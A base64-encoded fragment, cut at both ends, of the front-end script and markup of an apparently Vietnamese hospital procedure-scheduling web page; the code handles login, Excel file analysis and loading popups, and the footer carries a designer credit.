CAgICAgICAgfTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKCfEkOG7i25oIGThuqFuZyB0aOG7nWkgZ2lhbiBraMO0bmcgxJHGsOG7o2MgaOG7lyB0cuG7oycpOw0KICAgICAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsNCiAgICAgICAgICAgICAgICBsb2dFcnJvcihgTOG7l2kgcGjDom4gdMOtY2ggdGjhu51pIGdpYW46ICR7ZXJyb3IubWVzc2FnZX1gLCByb3dJbmRleCwgeyANCiAgICAgICAgICAgICAgICAgICAgdmFsdWU6IGRhdGV0aW1lU3RyLA0KICAgICAgICAgICAgICAgICAgICBlcnJvckRldGFpbHM6IGVycm9yLnN0YWNrIA0KICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgICAgIHJldHVybiBudWxsOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgLy8gPT09PT09PT09PSBLSOG7nkkgVOG6oE8gU+G7sCBLSeG7hk4gPT09PT09PT09PSAvLw0KICAgICAgICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdET01Db250ZW50TG9hZGVkJywgZnVuY3Rpb24oKSB7DQoJCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd1c2VybmFtZUlucHV0JykuZm9jdXMoKTsNCiAgICAgICAgICAgIC8vIEtoaSB0cmFuZyBsb2FkDQogICAgICAgICAgICBpZiAoIXNlc3Npb25TdG9yYWdlLmdldEl0ZW0oJ21lZFVzZXInKSkgew0KICAgICAgICAgICAgICAgIGRvY3VtZW50LmJvZHkuY2xhc3NMaXN0LmFkZCgnbG9naW4tcGFnZScpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBLaeG7g20gdHJhIMSRxINuZyBuaOG6rXAga2hpIHRyYW5nIHThuqNpDQoJCQ0KCQkJDQogICAgICAgICAgICBjaGVja1NhdmVkTG9naW4oKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gR8OhbiBz4buxIGtp4buHbiBjaG8gbsO6dCDEkcSDbmcgbmjhuq1wDQogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5CdG4nKS5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpID0+IHsNCiAgICBpc0xvZ2luQWN0aW9uID0gdHJ1ZTsgLy8g4pyFIFRow6ptIGTDsm5nIG7DoHkNCiAgICBjaGVja0xvZ2luKCk7DQp9KTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gR8OhbiBz4buxIGtp4buHbiBjaG8gbsO6dCDEkcSDbmcgeHXhuqV0DQogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9nb3V0QnRuJykuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCAoKSA9PiB7DQogICAgaXNMb2dpbkFjdGlvbiA9IGZhbHNlOyAvLyDinIUgVGjDqm0gZMOybmcgbsOgeQ0KICAgIGxvZ291dCgpOw0KfSk7DQoNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gxJDEg25nIG5o4bqtcCBi4bqxbmcgcGjDrW0gRW50ZXINCiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXNzd29yZElucHV0JykuYWRkRXZlbnRMaXN0ZW5lcigna2V5dXAnLCBmdW5jdGlvbihldmVudCkgew0KICAgICAgICAgICAgICAgIGlmIChldmVudC5rZXkgPT09ICdFbnRlcicpIHsNCiAgICAgICAgICAgICAgICAgICAgY2hlY2tMb2dpbigpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBHw6FuIHPhu7Ega2nhu4duIGNobyBuw7p0IHBow6JuIHTDrWNoIGZpbGUNCiAgICAgICAgICAgIA0KZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2FuYWx5emVCdG4nKS5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIGFzeW5jICgpID0+IHsNCiAgYXdhaXQgZW5zdXJlWExTWCgpOyAvLyBu4bqhcCBYTFNYIMSRw7puZyBsw7pjIGTDuW5nDQogICAgY29uc3QgZmlsZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWxlSW5wdXQnKS5maWxlc1swXTsNCmlmICghZmlsZSkgew0KICAgIGNvbnN0IHBvcHVwID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdQb3B1cCcpOw0KICAgIGNvbnN0IGxvYWRpbmdUZXh0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdUZXh0Jyk7DQogICAgY29uc3QgcHJvZ3Jlc3NCYXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncHJvZ3Jlc3NCYXInKTsNCg0KICAgIGxvYWRpbmdUZXh0LmlubmVySFRNTCA9IGANCiAgICAgICAgPGkgY2xhc3M9ImZhcyBmYS1leGNsYW1hdGlvbi10cmlhbmdsZSIgc3R5bGU9ImZvbnQtc2l6ZToyNHB4O2NvbG9yOnJlZDttYXJnaW4tYm90dG9tOjEwcHg7Ij48L2k+PGJyLz4NCiAgICAgICAgPHN0cm9uZz5WdWkgbMOybmcgY2jhu41uIGZpbGUgdHLGsOG7m2Mga2hpIGtp4buDbSB0cmE8L3N0cm9uZz48YnIvPjxici8+DQogICAgICAgIDxidXR0b24gY2xhc3M9ImJ0biIgb25jbGljaz0iZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdQb3B1cCcpLnN0eWxlLmRpc3BsYXk9J25vbmUnIj7EkMOzbmc8L2J1dHRvbj4NCiAgICBgOw0KICAgIHByb2dyZXNzQmFyLnN0eWxlLndpZHRoID0gJzAlJzsNCiAgICANCiAgICBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gJ2ZsZXgnOw0KICAgIHBvcHVwLmNsYXNzTGlzdC5hZGQoJ3Nob3cnKTsNCiAgICByZXR1cm47DQp9DQoNCg0KICAgIGNvbnN0IHBvcHVwID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdQb3B1cCcpOw0KICAgIGNvbnN0IGxvYWRpbmdUZXh0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdUZXh0Jyk7DQogICAgY29uc3QgcHJvZ3Jlc3NCYXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncHJvZ3Jlc3NCYXInKTsNCg0KICAgIHBvcHVwLnN0eWxlLmRpc3BsYXkgPSAnZmxleCc7DQogICAgcmVxdWVzdEFuaW1hdGlvbkZyYW1lKCgpID0+IHBvcHVwLmNsYXNzTGlzdC5hZGQoJ3Nob3cnKSk7DQoNCiAgICBsb2FkaW5nVGV4dC5pbm5lckhUTUwgPSAnPGkgY2xhc3M9ImZhcyBmYS1wYXBlci1wbGFuZSIgc3R5bGU9ImZvbnQtc2l6ZToyNHB4O2NvbG9yOiMzNDk4ZGI7bWFyZ2luLWJvdHRvbToxMHB4OyI+PC9pPjxici8+xJBhbmcgZ+G7rWkgZOG7ryBsaeG7h3UgduG7gSBtw6F5IGNo4bunLi4uJzsNCiAgICBwcm9ncmVzc0Jhci5zdHlsZS53aWR0aCA9ICczMyUnOw0KCQ0KCQ0KCQ0KCWNvbnN0IHByb2dyZXNzQmFyQ29udGFpbmVyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Byb2dyZXNzQmFyQ29udGFpbmVyJyk7DQoNCi8vIENo4buJIHThuqFvIDEgbOG6p24NCmlmICghZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2NyZWRpdExpbmVCZWxvdycpKSB7DQogIGNvbnN0IGNyZWRpdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOw0KICBjcmVkaXQuaWQgPSAnY3JlZGl0TGluZUJlbG93JzsNCiAgY3JlZGl0LmlubmVyVGV4dCA9ICfCqSBUaGnhur90IGvhur8gJiBwaMOhdCB0cmnhu4NuIGLhu59pIERyLiBDaMOidSc7DQogIGNyZWRpdC5zdHlsZS5tYXJnaW5Ub3AgPSAnMTBweCc7DQogIGNyZWRpdC5zdHlsZS5mb250U2l6ZSA9ICcxNnB4JzsNCiAgY3JlZGl0LnN0eWxlLmNvbG9yID0gJyNGRjAwMDAnOw0KICBjcmVkaXQuc3R5bGUudGV4dEFsaWduID0gJ2NlbnRlcic7DQoNCiAgcHJvZ3Jlc3NCYXJDb250YWluZXIucGFyZW50Tm9kZS5pbnNlcnRCZWZvcmUoY3JlZGl0LCBwcm9ncmVzc0JhckNvbnRhaW5lci5uZXh0U2libGluZyk7DQp9DQoJDQoJDQoJDQoJDQogICAgYXdhaXQgbmV3IFByb21pc2UocmVzb2x2ZSA9PiByZXF1ZXN0QW5pbWF0aW9uRnJhbWUoKCkgPT4gc2V0VGltZW91dChyZXNvbHZlLCA1MCkpKTsNCiAgICBhd2FpdCBuZXcgUHJvbWlzZShyZXNvbHZlID0+IHNldFRpbWVvdXQocmVzb2x2ZSwgNzAwKSk7DQoNCiAgICBwcm9ncmVzc0Jhci5zdHlsZS53aWR0aCA9ICc2NiUnOw0KDQogICAgbGV0IHRvdGFsID0gMDsNCiAgICB0cnkgew0KICAgICAgICBjb25zdCBmaWxlUmVhZGVyID0gbmV3IEZpbGVSZWFkZXIoKTsNCiAgICAgICAgY29uc3QgZGF0YSA9IGF3YWl0IG5ldyBQcm9taXNlKChyZXNvbHZlLCByZWplY3QpID0+IHsNCiAgICAgICAgICAgIGZpbGVSZWFkZXIub25sb2FkID0gZSA9PiByZXNvbHZlKG5ldyBVaW50OEFycmF5KGUudGFyZ2V0LnJlc3VsdCkpOw0KICAgICAgICAgICAgZmlsZVJlYWRlci5vbmVycm9yID0gKCkgPT4gcmVqZWN0KG5ldyBFcnJvcigiTOG7l2kgxJHhu41jIGZpbGUiKSk7DQogICAgICAgICAgICBmaWxlUmVhZGVyLnJlYWRBc0FycmF5QnVmZmVyKGZpbGUpOw0KICAgICAgICB9KTsNCg0KICAgICAgICBjb25zdCB3b3JrYm9vayA9IFhMU1gucmVhZChkYXRhLCB7IHR5cGU6ICdhcnJheScgfSk7DQogICAgICAgIGNvbnN0IGZpcnN0U2hlZXQgPSB3b3JrYm9vay5TaGVldHNbd29ya2Jvb2suU2hlZXROYW1lc1sxXV07DQogICAgICAgIGNvbnN0IGpzb25EYXRhID0gWExTWC51dGlscy5zaGVldF90b19qc29uKGZpcnN0U2hlZXQsIHsNCiAgICAgICAgICAgIGhlYWRlcjogMSwNCiAgICAgICAgICAgIGRlZnZhbDogIiIsDQogICAgICAgICAgICBibGFua3Jvd3M6IHRydWUNCiAgICAgICAgfSk7DQoNCiAgICAgICAgY29uc3Qgcm93cyA9IGpzb25EYXRhLnNsaWNlKDkpOw0KICAgICAgICB0b3RhbCA9IHJvd3MubGVuZ3RoOw0KICAgIH0gY2F0Y2ggew0KICAgICAgICB0b3RhbCA9IDEwMDA7DQogICAgfQ0KDQogICAgY29uc3Qgc3RlcCA9IDEwMDsNCiAgICBjb25zdCBzdGVwcyA9IE1hdGguY2VpbCh0b3RhbCAvIHN0ZXApOw0KICAgIGNvbnN0IGludGVydmFsID0gMjYwMCAvIHN0ZXBzOw0KDQogICAgZm9yIChsZXQgaSA9IDE7IGkgPD0gc3RlcHM7IGkrKykgew0KICAgICAgICBjb25zdCBjdXJyZW50ID0gTWF0aC5taW4oaSAqIHN0ZXAsIHRvdGFsKTsNCiAgICAgICAgbG9hZGluZ1RleHQuaW5uZXJIVE1MID0gJzxpIGNsYXNzPSJmYXMgZmEtdXNlci1tZCIgc3R5bGU9ImZvbnQtc2l6ZToyNHB4O2NvbG9yOiMyOTgwYjk7bWFyZ2luLWJvdHRvbToxMHB4OyI+PC9pPjxici8+xJBhbmcgcGjDom4gdMOtY2ggZOG7ryBsaeG7h3UgdOG7q25nIGLhu4duaCBuaMOibi4uLjxicj4nICsgY3VycmVudCArICcgLyAnICsgdG90YWw7DQogICAgICAgIGF3YWl0IG5ldyBQcm9taXNlKHIgPT4gc2V0VGltZW91dChyLCBpbnRlcnZhbCkpOw0KICAgIH0NCg0KICAgIGxvYWRpbmdUZXh0LmlubmVySFRNTCA9ICc8aSBjbGFzcz0iZmFzIGZhLWNoZWNrLWNpcmNsZSIgc3R5bGU9ImZvbnQtc2l6ZToyNHB4O2NvbG9yOmdyZWVuO21hcmdpbi1ib3R0b206MTBweDsiPjwvaT48YnIvPsSQw6Mga2nhu4NtIHRyYSB4b25nLi4uJzsNCiAgICBwcm9ncmVzc0Jhci5zdHlsZS53aWR0aCA9ICcxMDAlJzsNCiAgICBhd2FpdCBuZXcgUHJvbWlzZShyZXNvbHZlID0+IHNldFRpbWVvdXQocmVzb2x2ZSwgMTAwMCkpOw0KDQppZiAoIXdpbmRvdy5pc0tob2FMb2kpIHsNCiAgICBwb3B1cC5jbGFzc0xpc3QucmVtb3ZlKCdzaG93Jyk7DQogICAgc2V0VGltZW91dCgoKSA9PiB7IHBvcHVwLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7IH0sIDUwMCk7DQoNCg0KfQ0KDQoNCg0KIGVsc2Ugew0KICAgIC8vIE7hur91IMSRYW5nIGzhu5dpIEtob2EsIEtIw5RORyDEkcaw4bujYyDhuqluIHBvcHVwDQogICAgcG9wdXAuY2xhc3NMaXN0LmFkZCgnc2hvdycpOw0KICAgIHBvcHVwLnN0eWxlLmRpc3BsYXkgPSAnZmxleCc7DQp9DQogICAgaGFuZGxlRmlsZSgpOw0KCQ0KCQ0KCQ0KCQ0Kc2V0VGltZW91dCgoKSA9PiB7DQogICAgLy8g4p2MIE7hur91IMSRYW5nIGzhu5dpIHTDqm4ga2hvYSB0aMOsIGdp4buvIG5ndXnDqm4gcG9wdXAsIEtIw5RORyDEkcaw4bujYyDhuqluLCBLSMOUTkcgaGnhu4duIG7DunQNCiAgICBpZiAod2luZG93LmlzS2hvYUxvaSkgew0KICAgICAgICBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gJ2ZsZXgnOw0KICAgICAgICBwb3B1cC5jbGFzc0xpc3QuYWRkKCdzaG93Jyk7DQogICAgICAgIHJldHVybjsNCiAgICB9DQoNCiAgICAvLyDinIUgTuG6v3Uga2jDtG5nIGzhu5dpLCB0aMOsIOG6qW4gcG9wdXAgdsOgIGhp4buHbiBuw7p0IGNo4bupYyBuxINuZw0KICAgIHBvcHVwLmNsYXNzTGlzdC5yZW1vdmUoJ3Nob3cnKTsNCiAgICBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KDQogICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnYnV0dG9uLmJ0bicpLmZvckVhY2goYnRuID0+IHsNCiAgICAgICAgIGlmIChidG4udGV4dENvbnRlbnQuaW5jbHVkZXMoJ0dp4budIHRy4buRbmcnKSB8fCANCiAgICAgICAgICAgICAgICBidG4udGV4dENvbnRlbnQuaW5jbHVkZXMoJ1Phuq9jIHRodeG7kWMgdGhhbmcnKSB8fA0KICAgICAgICAgICAgICAgIGJ0bi50ZXh0Q29udGVudC5pbmNsdWRlcygnRGFuaCBzw6FjaCBi4buHbmggbmjDom4nKSkgew0KICAgICAgICAgICAgICAgIGJ0bi5zdHlsZS5kaXNwbGF5ID0gJ2lubGluZS1ibG9jayc7DQogICAgICAgIH0NCiAgICB9KTsNCn0sIDUwMCk7DQoNCg0KCQ0KCQ0KCSAgICAvLyBD4bqtcCBuaOG6rXQgZ+G7o2kgw70ga2hpIHRoYXkgxJHhu5VpIHTDuXkgY2jhu41uIHRo4budaSBnaWFuDQogZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnaW5wdXRbbmFtZT0idGltZU9wdGlvbiJdJykuZm9yRWFjaChyYWRpbyA9PiB7DQogICAgICAgIHJhZGlvLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGZ1bmN0aW9uKCkgew0KICAgICAgICAgICAgaWYgKG1hY2hpbmVDb25mbGljdExvZyAmJiBtYWNoaW5lQ29uZmxpY3RMb2cubGVuZ3RoID4gMCkgew0KICAgICAgICAgICAgICAgIGdlbmVyYXRlTWFjaGluZVRpbWVTdWdnZXN0aW9ucygpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9KTsNCiAgICB9KTsNCg0KICAgIC8vIEPhuq1wIG5o4bqtdCBn4bujaSDDvSBraGkgdGhheSDEkeG7lWkgc+G7kSBsxrDhu6NuZyBraHVuZyBnaeG7nQ0KIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzaG93TW9yZVN1Z2dlc3Rpb25zQ2hlY2tib3gnKS5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBmdW5jdGlvbigpIHsNCiAgICAgICAgaWYgKG1hY2hpbmVDb25mbGljdExvZyAmJiBtYWNoaW5lQ29uZmxpY3RMb2cubGVuZ3RoID4gMCkgew0KICAgICAgICAgICAgZ2VuZXJhdGVNYWNoaW5lVGltZVN1Z2dlc3Rpb25zKCk7DQogICAgICAgIH0NCiAgICB9KTsNCgkNCgkNCn0pOw0KDQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIEfDoW4gc+G7sSBraeG7h24gY2hvIGRyb3Bkb3duIGzhu41jDQogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb3BlcmF0b3JTZWxlY3QnKS5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBmaWx0ZXJCeU9wZXJhdG9yKTsNCiAgICAgICAgICAgIA0KCQkJDQoJCQlkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2hvd0RvY3RvckNoZWNrYm94JykuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgZmlsdGVyQnlPcGVyYXRvcik7DQoJCQkNCgkJCQ0KICAgICAgICAgICAgLy8gR8OhbiBz4buxIGtp4buHbiBjaG8gcmFkaW8gYnV0dG9uIGNo4buNbiBraHVuZyBnaeG7nQ0KICAgICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnaW5wdXRbbmFtZT0idGltZU9wdGlvbiJdJykuZm9yRWFjaChyYWRpbyA9PiB7DQogICAgICAgICAgICAgICAgcmFkaW8uYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgZnVuY3Rpb24oKSB7DQogICAgICAgICAgICAgICAgICAgIGlmIChhbGxQcm9jZWR1cmVzLmxlbmd0aCA+IDApIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGdlbmVyYXRlVGltZVN1Z2dlc3Rpb25zKGFsbFByb2NlZHVyZXMpOw0KICAgICAgICAgICAgICAgICAgICAgICAgZmlsdGVyQnlPcGVyYXRvcigpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfSk7DQogICAgICAgICAgICB9KTsNCgkJCQ0KCQkJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ29wZXJhdG9yU2VsZWN0JykuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgZnVuY3Rpb24oKSB7DQogICAgZmlsdGVyQnlPcGVyYXRvcigpOw0KfSk7DQoNCiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb3BlcmF0b3JTZWxlY3RFcnJvcicpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGZ1bmN0aW9uICgpIHsNCiAgIC8vIGNo4buJIHJlbmRlciBs4bqhaSwgS0jDlE5HIMSR4bulbmcgZHJvcGRvd24gYsOqbiBraWENCiAgIGZpbHRlckJ5T3BlcmF0b3IoKTsNCiB9KTsNCgkJCQ0KICAgICAgICB9KTsNCiAgICA8L3NjcmlwdD4NCjxkaXYgY2xhc3M9InByb2NlZHVyZS1pbmZvIj48Y2VudGVyPiANCkRlc2lnbiBCeSA8YSBocmVmPSJodHRwOi8vZmIuY29tL2NoYXVodXluaDAxMDQiIHRhcmdldD0iX2JsYW5rIj4gRHIuQ2jDonU8L2E+PGJyLz4NCiAgICAgICAgICAgICAgICBO4bq/dSBDw7MgQuG6pXQgS+G7syBWxrDhu5tuZyBN4bqvYyBHw6wgVnVpIEzDsm5nIExIIDogPGJyLz4NCiAgICAgICAgICAgICAgICBFbWFpbDogY2hhdWh1eW5oMDEwNEBnbWFpbC5jb208YnIvPg0KICAgICAgICAgICAgICAgIFNEVDogMDc5LjU2Ny45MzUwPC9jZW50ZXI+DQo8L2Rpdj4NCg0KDQoNCjxzY3JpcHQ+DQogIC8vIEjhu5cgdHLhu6MgbmjhuqVuIEVudGVyIHThu6sgw7QgdXNlcm5hbWUgaG/hurdjIHBhc3N3b3JkDQogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd1c2VybmFtZUlucHV0JykuYWRkRXZlbnRMaXN0ZW5lcigna2V5dXAnLCBmdW5jdGlvbihldmVudCkgew0KICAgIGlmIChldmVudC5rZXkgPT09ICdFbnRlcicpIHsNCiAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXNzd29yZElucHV0JykuZm9jdXMoKTsNCiAgICB9DQogIH0pOw0KDQogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXNzd29yZElucHV0JykuYWRkRXZlbnRMaXN0ZW5lcigna2V5dXAnLCBmdW5jdGlvbihldmVudCkgew0KICAgIGlmIChldmVudC5rZXkgPT09ICdFbnRlcicpIHsNCiAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpbkJ0bicpLmNsaWNrKCk7DQogICAgfQ0KICB9KTsNCg0KLy8gPT09PT09IFThu7AgxJDhu5hORyBRVcOJVCBUSMavIE3hu6RDICYgQ0jhu4xOIEZJTEUgTeG7mkkgTkjhuqRUID09PT09PQ0KDQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZm9sZGVyQnRuJykuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCAoKSA9PiB7DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZvbGRlcklucHV0JykuY2xpY2soKTsNCn0pOw0KDQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZm9sZGVySW5wdXQnKS5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBhc3luYyAoZSkgPT4gew0KIGF3YWl0IGVuc3VyZVhMU1goKTsgLy8gbuG6oXAgWExTWCB0csaw4bubYyBraGkgxJHhu41jIHdvcmtib29rDQogICAgY29uc3QgZmlsZXMgPSBBcnJheS5mcm9tKGUudGFyZ2V0LmZpbGVzKS5maWx0ZXIoZiA9PiAvXC4oeGxzeHx4bHN8Y3N2KSQvaS50ZXN0KGYubmFtZSkpOw0KICAgIGNvbnN0IHN0YXR1c0RpdiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzY2FuU3RhdHVzJyk7DQogICAgY29uc3QgZmlsZUlucHV0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbGVJbnB1dCcpOw0KDQogICAgaWYgKGZpbGVzLmxlbmd0aCA9PT0gMCkgew0KICAgICAgICBzdGF0dXNEaXYuc3R5bGUuY29sb3IgPSAncmVkJzsNCiAgICAgICAgc3RhdHVzRGl2LmlubmVySFRNTCA9ICdLaMO0bmcgdMOsbSB0aOG6pXkgZmlsZSBFeGNlbCBo4bujcCBs4buHIHRyb25nIHRoxrAgbeG7pWMuJzsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCg0KICAgIGxldCB2YWxpZEZpbGUgPSBudWxsOw0KDQogICAgZm9yIChjb25zdCBmaWxlIG9mIGZpbGVzLnNvcnQoKGEsIGIpID0+IGIubGFzdE1vZGlmaWVkIC0gYS5sYXN0TW9kaWZpZWQpKSB7DQogICAgICAgIHRyeSB7DQogICAgICAgICAgICBjb25zdCBkYXRhID0gYXdhaXQgZmlsZS5hcnJheUJ1ZmZlcigpOw0KICAgICAgICAgICAgY29uc3Qgd29ya2Jvb2sgPSBYTFNYLnJlYWQoZGF0YSwgeyB0eXBlOiAnYXJyYXknIH0pOw0KDQogICAgICAgICAgICBpZiAoIXdvcmtib29rLlNoZWV0TmFtZXNbMV0pIGNvbnRpbnVlOyAvLyBj4bqnbiBTaGVldCB0aOG7qSAyDQoNCiAgICAgICAgICAgIGNvbnN0IHNoZWV0ID0gd29ya2Jvb2suU2hlZXRzW3dvcmtib29rLlNoZWV0TmFtZXNbMV1dOw0KICAgICAgICAgICAgY29uc3QganNvbkRhdGEgPSBYTFNYLnV0aWxzLnNoZWV0X3RvX2pzb24oc2hlZXQsIHsgaGVhZGVyOiAxLCBkZWZ2YWw6ICIiLCBibGFua3Jvd3M6IHRydWUgfSk7DQoNCiAgICAgICAgICAgIGlmIChqc29uRGF0YS5sZW5ndGggPj0gMTApIHsgLy8gw610IG5o4bqldCAyIGTDsm5nIGhlYWRlciB2w6AgY8OzIGThu68gbGnhu4d1IGTDsm5nIDEwDQogICAgICAgICAgICAgICAgdmFsaWRGaWxlID0gZmlsZTsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBjYXRjaCAoZXJyKSB7DQogICAgICAgICAgICBjb25zb2xlLmVycm9yKGBM4buXaSDEkeG7jWMgZmlsZSAke2ZpbGUubmFtZX06YCwgZXJyKTsNCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIGlmICh2YWxpZEZpbGUpIHsNCiAgICAgICAgY29uc3QgZHQgPSBuZXcgRGF0YVRyYW5zZmVyKCk7DQogICAgICAgIGR0Lml0ZW1zLmFkZCh2YWxpZEZpbGUpOw0KICAgICAgICBmaWxlSW5wdXQuZmlsZXMgPSBkdC5maWxlczsNCg0KICAgICAgICAvLyBj4bqtcCBuaOG6rXQgdHLhuqFuZyB0aMOhaQ0KICAgICAgICBzdGF0dXNEaXYuaW5uZXJIVE1MID0gYDxpIGNsYXNzPSJmYXMgZmEtZm9sZGVyLW9wZW4iPjwvaT4gxJDDoyBjaOG7jW4gZmlsZTogPGI+JHt2YWxpZEZpbGUubmFtZX08L2I+YDsNCiAgICAgICAgc3RhdHVzRGl2LnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgICAgICBzdGF0dXNEaXYuc3R5bGUuY29sb3IgPSAnIzJjM2U1MCc7DQoNCiAgICAgICAgLy8gR+G7jWkga2nhu4NtIHRyYQ0KICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYW5hbHl6ZUJ0bicpLmNsaWNrKCk7DQogICAgfSBlbHNlIHsNCiAgICAgICAgc3RhdHVzRGl2LnN0eWxlLmNvbG9yID0gJ3JlZCc7DQogICAgICAgIHN0YXR1c0Rpdi5pbm5lckhUTUwgPSAnS2jDtG5nIHTDrG0gxJHGsOG7o2MgZmlsZSBjw7MgY+G6pXUgdHLDumMgaOG7o3AgbOG7hy4gVnVpIGzDsm5nIGtp4buDbSB0cmEgbOG6oWkuJzsNCiAgICB9DQp9KTsNCg0KDQo8L3NjcmlwdD4NCjxkaXYgY2xhc3M9InRvYXN0IiBpZD0idG9hc3QiPjwvZGl2Pg0KPCEtLSBQb3B1cCBsb2FkaW5nIC0tPg0KPGRpdiBpZD0ibG9hZGluZ1BvcHVwIiBzdHlsZT0iZGlzcGxheTpub25lO3Bvc2l0aW9uOmZpeGVkO3RvcDowO2xlZnQ6MDt3aWR0aDoxMDAlO2hlaWdodDoxMDAlO2JhY2tncm91bmQ6cmdiYSgwLDAsMCwwLjUpO3otaW5kZXg6OTk5OTtqdXN0aWZ5LWNvbnRlbnQ6Y2VudGVyO2FsaWduLWl0ZW1zOmNlbnRlcjtmb250LWZhbWlseTonSW50ZXInLHNhbnMtc2VyaWYiPg0KPGRpdiBzdHlsZT0iYmFja2dyb3VuZDojZmZmO3BhZGRpbmc6MzBweCA0MHB4O2JvcmRlci1yYWRpdXM6MTBweDt0ZXh0LWFsaWduOmNlbnRlcjtib3gtc2hhZG93OjAgMCAxNXB4IHJnYmEoMCwwLDAsMC4zKTttYXgtd2lkdGg6OTAlO2ZvbnQtc2l6ZToxOHB4Ij4NCjxkaXYgaWQ9ImxvYWRpbmdUZXh0Ij4NCjxpIGNsYXNzPSJmYXMgZmEtc3Bpbm5lciBmYS1zcGluIiBzdHlsZT0iZm9udC1zaXplOjI0cHg7Y29sb3I6IzM0OThkYjttYXJnaW4tYm90dG9tOjEwcHg7Ij48L2k+PGJyLz4NCiAgICAgIMSQYW5nIGfhu61pIGThu68gbGnhu4d1IHbhu4EgbcOheSBjaOG7py4uLg0KICAgIDwvZGl2Pg0KPGRpdiBpZD0icHJvZ3Jlc3NCYXJDb250YWluZXIiPg0KPGRpdiBpZD0icHJvZ3Jlc3NCYXIiPjwvZGl2Pg0KPGRpdiBpZD0iYXZhaWxhYmlsaXR5VGFibGUiIHN0eWxlPSJkaXNwbGF5OiBub25lOyBtYXJnaW4tdG9wOiAyMHB4OyI+DQogIDxoMj5UaOG7kW5nIGvDqiBnaeG7nSB0cuG7kW5nIHThu6tuZyBuZ8aw4budaTwvaDI+DQogIDx0YWJsZSBjbGFzcz0iZXJyb3ItdGFibGUiPg0KICAgIDx0aGVhZD4NCiAgICAgIDx0cj4NCiAgICAgICAgPHRoPk5nxrDhu51pIHRo4buxYyBoaeG7h248L3RoPg0KICAgICAgICA8dGg+TmfDoHk8L3R